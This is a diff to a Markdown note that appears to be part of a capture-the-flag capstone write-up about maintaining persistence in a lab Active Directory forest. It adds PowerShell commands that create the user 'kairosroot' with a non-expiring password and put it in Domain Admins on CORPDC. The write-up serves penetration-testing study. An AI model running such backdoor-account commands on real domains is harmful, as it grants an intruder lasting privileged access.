@@ -30,6 +30,7 @@ PS C:\Users\Administrator> `echo $group`
 ![[Maintain persistence-20240613153950655.webp]]
 
 
+`
 ## RDP to ROOTDC
 
 With our new created user, we can just login in the ROOTDC as an Enterprise Admin.
@@ -58,5 +59,24 @@ Computer: `10.200.X.100`
     - Click **Connect** to start the remote session.
 
     ![[Maintain persistence-20240616151550123.webp]]
+
+
+## <span style="background:#d4b106">Create an user at CORPDC as a Domain Admin</span>
+
+This user will allow us to login with both accounts in different domains:
+
+> **Thereserve**\<user> (Enterprise Admin)
+> **Corp.thereserve.loc**\<user> (Domain Admin)
+
+PS C:\Users\Administrator>`$pwd = convertTo-SecureString "Capstone1@" -AsPlainText -Force`
+
+PS C:\Users\Administrator> `New-ADUser -Name "kairosroot" -AccountPassword $pwd -PasswordNeverExpires $true -Enabled $true`
+
+PS C:\Users\Administrator>`$User = Get-ADUser -Identity "kairosroot"  -Server "corpdc.bank.thereserve.loc"`
+
+PS C:\Users\Administrator>`$Group = Get-ADGroup -Identity "Domain Admins" -Server "corpdc.bank.thereserve.loc"`
+
+PS C:\Users\Administrator>`Add-ADGroupMember -Identity $Group -Members $User -Server "corpdc.bank.thereserve.loc"
+
 
 **Next step:** [[RDP to BANKDC from host CORPDC]]
